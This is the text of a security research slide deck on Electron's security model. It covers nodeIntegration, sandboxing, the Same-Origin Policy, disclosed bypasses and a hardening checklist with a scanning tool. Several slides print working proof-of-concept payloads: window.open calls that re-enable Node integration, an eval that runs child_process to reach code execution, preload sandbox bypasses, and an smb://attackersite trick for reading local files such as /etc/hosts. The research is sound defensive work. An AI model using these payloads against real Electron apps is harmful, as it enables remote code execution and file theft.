1. Electron Overview

https://electron.atom.io/

 OpenSource framework to build desktop apps using HTML, CSS and JavaScript 
 Maintained by 

"If you can build a website, you can build a desktop app"

Principles
 Cross-platform. runtime with self-contained dependencies
 Modular. To facilitate re-use and keep Electron small and simple
 Easy to use. You shouldn't worry about installers, profiling, debugging, notifications, updates, ...

Back and forth
 Web Development is fun, but...  Conditional rules for all different browsers and versions  Limited I/O with the OS  Performance and network latency

Ingredients

Lifecycle

app.asar

package.json

main process main.js

render process
render process
render process render.js
...

HTML CSS
JS

Processes

Main
ipcMain Node.js API Menu, Tray, ... BrowserWindow

Renderer

communicates creates

Node.js API ipcRenderer <webview>
DOM webFrame

IpcMain and ipcRenderer 1/2
 Synchronous and Asynchronous messages from the renderer (web page) to the main process
// Main const {ipcMain} = require('electron') ipcMain.on('synchronous-message', (event, arg) => {
console.log(arg) event.returnValue = 'pong' })
// Renderer const {ipcRenderer} = require('electron') console.log(ipcRenderer.sendSync('synchronous-message', 'ping'))

IpcMain and ipcRenderer 2/2
 Interestingly, this is also used for implementing native Electron APIs
 /lib/browser/rpc-server.js

2. Ecosystem

Many Electron-based Apps
...and 350* more
* Registered on https://electron.atom.io/apps/

Electron -- NPM
 So, you can import custom NPM modules
 ~Half a million packages of vulnerable reusable code  "How I obtained publish access to 13% of npm packages (including popular ones)"  "LeftPad broke the Internet"
 There are also Electron-specific modules:  Tools  Boilerplates  Components

3. Security Model

Browser Security Model
"Several experts have told me in all seriousness that browser security models are now so complex that I should not even write a section about this"
Threat Modeling - Adam Shostack

Browser Threat Model

Browser Threat Model

From Browser to Electron - Malicious Content
 Untrusted content from the web
 Limited interaction, compared to a browser  E.g. opening a <webview> with a remote origin
 Untrusted local resources
 Extended attack surface  E.g. loading subtitle files

From Browser to Electron - Isolation
 Potential access to Node.js primitives  Limited Chrome-like sandbox
 From XSS to RCE  Exploits are reliable

Electron is NOT a browser
 While it is based on Chromium's Content module, certain principles and security mechanisms implemented by modern browsers are not enforced in today's Electron  Things will change in Electron v2.x

nodeIntegration / nodeIntegrationInWorker
 Control whether access to Node.js primitives is allowed from JavaScript  Part of webPreferences  In recent versions, Chrome's Isolated Worlds is used  New v8 context with proxies to the window and document object (ro)

nodeIntegration

TRUE

FALSE

Renderer Isolation
1. BrowserWindow (nodeIntegration enabled by default)

mainWindow = new BrowserWindow({ "webPreferences": { "nodeIntegration" : false, "nodeIntegrationInWorker" : false }});
2. <webview> tag (nodeIntegration disabled by default)
<webview id="foo" src="https://www.doyensec.com/"></webview>

Sandboxing 1/2
 sandbox - Experimental feature  Currently supports BrowserWindow only  This will allow renderer to run inside a native
Chromium OS sandbox  All communication via IPC to the main process  When sanbox is enabled, nodeintegration is
disabled

Sandboxing 2/2
 Sandboxing needs to be explicitly enabled: 
mainWindow = new BrowserWindow({ "webPreferences": { "sandbox" : true}});
 To enable it for all BrowserWindow instances, a command line argument is necessary: 
$ electron --enable-sandbox app.js

Resistance is futile
 Preload scripts still have access to few modules
 child_process, crashReporter, remote, ipcRenderer, fs, os, times, url
1. Sandbox bypass in preload scripts using remote   app = require('electron').remote.app
2. Sandbox bypass in preload scripts using internal Electron IPC messages  
{ipcRenderer} = require('electron') app = ipcRenderer.sendSync('ELECTRON_BROWSER_GET_BUILTIN', 'app')

ContextIsolation
 This flag introduces JavaScript context isolation for preload scripts, as implemented in Chrome Content Scripts
 Preload scripts still have access to global variables (ro)
 
win = new BrowserWindow({ webPreferences: { contextIsolation: true, preload: 'preload.js'
}})

Electron vs Muon

Muon



Brave's fork of Electron

 Direct use of Chromium source code  Support for Chrome extensions  Node.js removed from the renderer  IPC still supported in the renderer
process through custom chrome.* APIs  Chromium OS sandbox

Foundation - Outdated Chromium and Node.js
 Electron-dev community is well aware  They've established an upgrade policy*:
 ~2 weeks after new stable Chrome  ~4 weeks after new Node.js
 V8 upgrades already there
* see https://electron.atom.io/docs/faq/#when-will-electron-upgrade-tolatest-chrome "This estimate is not guaranteed and depends on the amount of work involved with upgrading"

Foundation - Outdated Chromium and Node.js
 Keeping track of all changes is hard
 Making sure that all security changes have been back-ported is even harder

I -- ChangeLogs
 On 2017-02-21, Node 7.6.0 release included the following pull request:

 Until May, Electron was still on Node 7.4.0  Notified the team on May 12, 2017  Fixed in v1.6.11 on May 25, 2017

Framework - Weaknesses and bugs
 Framework level bugs are particularly interesting: 1. Deviations from browser principles and security mechanisms 2. Implementation bugs
 Mostly discovered reading source code and documentation

Framework - Outdated vulnerable versions
 Apps are shipped with a build of Electron  nodeIntegration bypasses are golden tickets:
1. Find XSS 2. Exploit the nodeIntegration bypass 3. Use Node.js APIs to obtain reliable RCE

History of nodeIntegration bypasses
 Limited disclosure of this type of vulnerabilities  "As it stands Electron Security" by Dean Kerr - 9 March 2016
 Window.Open - Fixed in v0.37.4 (Issue 4026)  Credit: Jeffrey Wear
<script> window.open("http://x.x.x.x/index.html", "","nodeIntegration=1");
</script>
 WebView Attribute - Fixed in v0.37.8 (Issue 3943)  Credit: Cheng Zhao
<webview nodeintegration src="http://x.x.xx/index.html"></webview>

Have I told you that I -- ChangeLogs?
 Goal: study all past vulnerabilities
 Starting from Electron v1.3.2, each release includes changelog entries
 Reverse psychology before reverse engineering
Never  Look  Here

Spot the security fix 1/2

Spot the security fix 2/2

Results:
 v1.4.15: The webview element now emits the context-menu event from the underlying webContents object
 v1.4.11: Fixed an issue where window.alert, window.close, and window.confirm did not behave as expected
 v1.3.13: Fixed an issue where window.alert, window.close, and window.confirm did not behave as expected
 v1.4.10: Fixed an issue where the window.opener API did not behave as expected
 v1.3.12: Fixed an issue where the window.opener API did not behave as expected
 v1.4.7: Fixed an issue where the window.opener API did not behave as expected  v1.3.9: Fixed an issue where the window.opener API did not behave as expected  v0.37.8: Disable node integration in webview when it is disabled in host page  v0.37.4: Disable node integration in child windows opened with window.open
when node integration is disabled in parent window

Electron core team is awesome!

Case Study: v1.3.9 Changes
 Protip: reversing a back-port is easier, smaller diff
 Included code changes to check whether the sender is parent of target, nodeIntegration is enabled and same origin
 So it had something to do with window.open without Node, but enabled in the parent 
 Proof-of-Concept:
<script> window.opener.eval(`window.open("http://x.x.x.x/foo.html","","nodeIntegration=yes")'); </script>

We're on 1.6.x
 Apparently, no bypasses fixed in recent versions
 Started reading the documentation and realized that I could bypass SOP using one of the following:
<script> const win1 = window.open("https://www.google.com"); win1.eval("alert(document.domain)"); </script>  <script> const win2 = window.open("https://www.google.com"); win2.location = "javascript:alert(document.domain)"; </script>

SOP-Bypass As a Feature
 The current implementation does not strictly enforce the Same-Origin Policy  Still work in progress
 https://github.com/electron/electron/pull/8963
 --disablewebsecurity exists, but it's kind of irrelevant

BrowserWindowProxy and Eval
 A good example of Electron's "Glorified" APIs  When you open a new window with open(), Electron
returns a BrowserWindowProxy object

Parent

1 - windows.open() 2 - BrowserWindowProxy obj 3 - windows.eval(js_code)

Child 4 - js_code

SOP2RCE
 How can we leverage the SOP-bypass to obtain code execution?
 lib/renderer/init.js

PoC - Reported on May 10 Fixed in v1.6.8
<!DOCTYPE html> <html>
<head> <title>Electron 1.6.7 BrowserWindowProxy SOP -> RCE</title>
</head> <body> <script>
document.write("Current location:" + window.location.href + "<br>");
const win = window.open("chrome-devtools://devtools/bundled/inspector.html"); win.eval("const execFile = require('child_process').execFile; const child = execFile('touch', ['/tmp/electronegativity'], (error, stdout, stderr) => {});"); </script> </body> </html>

Demo - Attacking Full Chain

Framework - "Glorified" APIs
 Electron extends the default JavaScript APIs  nodeIntegration doesn't affect this behavior  However, sandboxed renderers are supposed
to have native Chromium-like APIs  Current implementation does not revert the
behavior of ALL "glorified" APIs

Example: HTML5 File path attribute
 HTML5 File API capabilities was extended in Electron with the path attribute
 Path exposes the file's real path on the fs
 For reference, modern browsers do limit path exposure during files upload
 E.g. IE8 replaces the filename property with a bogus value c:\fakepath\file.txt

Framework - "Glorified" APIs bug
 The extended behavior is still exposed even when sandbox:true
 A remote origin could leverage this bug to leak the full path and username
 Reported on May 10th, still open

Framework - Deviations from browser standards
 We have already discussed SOP enforcement  file:// handler can be abused to read arbitrary files
 Untrusted page can read local resources without user interaction  Open issue https://github.com/electron/electron/issues/5151
window.open("smb://guest:guest@attackersite/public/"); setTimeout(function(){ window.open("file:///Volumes/public/test.html"); }, 10000);
<!-- test.html --> <iframe src="file:///etc/hosts" onload="alert(this.contentDocument.body.innerHTML)"></ iframe>
 Fewer restrictions around privacy and secure UX

Example: HTML5 Media Capture API
 HTML5 allows access to local media devices, thus making possible to record video and audio
 Browsers have implemented notification to inform the user that a remote site is capturing the webcam stream

HTML5 Media Capture API in Electron
 Electron does not display any notification  XSS on Electron apps can be leveraged to
silently capture screenshots, video and audio recording

5. Electron-based Apps 
Security Checklist 


Custom Code - Vulnerabilities in your app
 On top of what we discussed so far, there are also application vulnerabilities  Traditional web vulnerabilities  Insecure use of Electron's APIs  Wrong assumptions (Browser vs Electron)

Our practical checklist
1. Disable nodeIntegration for untrusted origins 2. Use sandbox for untrusted origins 3. Review the use of command line arguments 4. Review the use of preload scripts 5. Do not use disablewebsecurity 6. Do not allow insecure HTTP connections 7. Do not use Chromium's experimental features 8. Limit navigation flows to untrusted origins 9. Use setPermissionRequestHandler for
untrusted origins 10. Do not use insertCSS, executeJavaScript or
eval with user-supplied content 11. Do not allow popups in webview 12. Review the use of custom protocol handlers 13. Review the use of openExternal

Electronegativity
 To facilitate secure development and security testing, we are also releasing a tool
 Leverages AST parsing to look for all issues discussed in the checklist 
 Our checklist white paper and Electronegativity code will be available at:  https://www.doyensec.com/research.html

Demo - Electronegativity

6. Conclusions

Conclusions
 We have examined and exposed Electron's design and implementation flaws
 We have derived a comprehensive checklist for developers and auditors
 Hopefully, our study will lead to more secure Electron apps
 Today's Electron is not secure (by default) to render untrusted content:  Having a good understanding of Electron's internals, secure apps can be built  v2.x is expected to be the security game-changer

Future Work
 Electron vs Muon  Leverage Electronegativity to understand
the state of Electron Apps security  More vulnerability research on Electron
